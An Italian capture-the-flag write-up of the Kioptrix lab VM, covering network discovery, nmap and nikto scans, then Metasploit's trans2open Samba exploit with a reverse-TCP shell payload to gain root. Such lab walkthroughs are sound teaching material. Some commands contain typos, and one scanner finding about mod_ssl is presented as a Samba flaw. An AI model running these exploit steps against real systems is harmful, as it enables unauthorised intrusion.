Kioptrix è una challenge boot to root, l'obiettivo è ottenere l'accesso root tamite tools e tecniche di valutazione delle vulnerabilità e di exploitation.

![Kioptrix1](https://user-images.githubusercontent.com/104534892/236891421-44073633-88ad-4558-89e5-fdcae109936a.png)

Approccio:
1. Network discovery 
2. Enumerazione 
3. Exploitation 
4. Ricerca flag

# 1. Network Discovery

Per prima cosa è necessario ottenere l'indirizzo IP della vittima, quindi eseguiamo una scansione tramite netdiscover:

>Cos'è netdiscover? è uno strumento di ricognizione per reti wireless utilizzato per rilevare passivamente host o cercarli attivamente mediante richieste ARP (Address Resolution Protocol).

Il comando per eseguire la scansione è: `sudo netdiscover`

![Kioptrix4](https://user-images.githubusercontent.com/104534892/236891485-df50e551-af9d-4d3c-bfaf-a2cf2bea4115.png)

Netdiscover ci restituisce il nome dell'host vittima "PCS Sysemtechnik" , il suo indirizzo IP (in questo caso 10.0.2.4) e l'indirizzo MAC.

# 2. Enumerazione

Ottenuto l'indirizzo IP possiamo utilizzare Nmap per verificare servizi, protocolli e porte aperte dell'host.

>Cos'è Nmap? Acronimo di Network Mapper è un tool open source per il rilevamento ed il controllo della sicurezza di rete, utilizza pacchetti IP raw per determinare quali host sono disponibili sulla rete, quali servizi (nome e versione), quali sistemi operativi (e la versione) e che tipo di firewall sono in uso e molto altro.

Eseguiamo una scansione tramite il comando: `sudo nmap 10.0.2.4 -sV -p- -T4 -O`
- -sV per identificare i servizi in esecuzione e la rispettiva versione
- -p- esegue una scansione di tutte le porte
- -T4 è per una scansione più aggressiva e rapida
- -0 per identificare il sistema operativo

![Kioptrix5](https://user-images.githubusercontent.com/104534892/236891538-36720eab-9ea2-4828-9585-8b350f5c0cbe.png)

Dalla scansione risulta aperta la porta 80/tcp che esegue Apache: controllando il sito web per verificare la presenza di eventuali web app di terze parti exploitabili questo ci riconduce soltanto ad una pagina di test che non ci fornisce alcuna informazione aggiuntiva, nemmeno il codice sorgente risulta essere utile.

![Kioptrix6](https://user-images.githubusercontent.com/104534892/236891571-a4e8d6df-fbfe-46c7-813f-7ff3c528572d.png)

Dalla precedente scansione effettuata con nmap si può notare che la porta 139/tcp esegue un netBIOS Samba smbd, ovvero un protocollo client-server per l'accesso a file e directories; Cerchiamo eventuali vulnerabilità nella versione in uso tramite Nikto:
`nikto -h http://10.0.2.4`

![Kioptrix7](https://user-images.githubusercontent.com/104534892/236891608-df43baa8-b967-41b1-b765-1cd21f94c167.png)

Dal risultato della scansione possiamo notare che la versione in utilizzo di Samba (2.2.1a) è vulnerabile ad un remote buffer overflow che ci permette di accedere alla shell da remoto e compromettere la VM vittima:
`mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082), OSVDB-756.`
trovata la vulnerabilità è necessario cercare un exploit, dopo alcune ricerche ho scoperto che il modulo di Metasploit da caricare è /exploit/linux/samba/trans2open (source: https://www.exploit-db.com/exploits/16861).

# 3. Exploitation

Per cercare l'exploit ed ottenere l'accesso utilizziamo Metasploit

>Cos'è Metasploit? è un framework open source per lo sviluppo, il testing e l'esecuzione codici exploit 
	
![Kioptrix8](https://user-images.githubusercontent.com/104534892/236891639-369449f1-af7b-4b35-a700-6ffe187bbcf7.png)
- `sudo msfdb init`
- `msfconsole`
avviamo il database come user "msf" e la console, in seguito cerchiamo la vulnerabilità ovvero trans2open: `search trans2open`

![Kioptrix9](https://user-images.githubusercontent.com/104534892/236891707-887aae6f-a647-42f0-807d-cb177a23749d.png)

selezioniamo il modulo dell'exploit trovato in precedenza `use exploit/linux/samba/tran2open` e visualizziamo i dettagli del payload da settare tramite `options`:

![Kioptrix10](https://user-images.githubusercontent.com/104534892/236891738-acc3c456-eecd-42db-afa3-588eecbbe61a.png)

In seguito impostiamo:
- il remote host (RHOST) `set RHOST10.0.2.4`
- il payload `set payload linux/x86/shell_reverse_tcp`
e lanciamo l'exploit `exploit` e generiamo la shell:

![Kioptrix12](https://user-images.githubusercontent.com/104534892/236891766-de3d8c41-ff09-4cb3-b77a-65624ea127a6.png)

Ottenuto l'accesso alla VM vittima verifichiamo i privilegi:

![Kioptrix13](https://user-images.githubusercontent.com/104534892/236891783-208d9439-2dc3-4b16-a1a7-b0a3bc944d0a.png)

Abbiamo ottenuto l'accesso root alla macchina, adesso basta generare una shell TTY tramite `/bin/bash -i` per utilizzare la shell bash.

# 4. Ricerca Flag

Prima di cercare la flag diamo un'occhiata all'history dei comandi utilizzati nella shell tramite `history`:

![Kioptrix14](https://user-images.githubusercontent.com/104534892/236891812-5a528c9b-87df-452c-83a2-5cf906aff2d9.png)

notiamo che è stato utilizzato il comando mail, quindi accediamo alla directory come utente root per leggerle le mail salvate:

![Kioptrix15](https://user-images.githubusercontent.com/104534892/236891829-19387e6f-80b0-4ac9-9a32-8854a67c53c0.png)

VM completata, abbiamo ottenuto la flag!
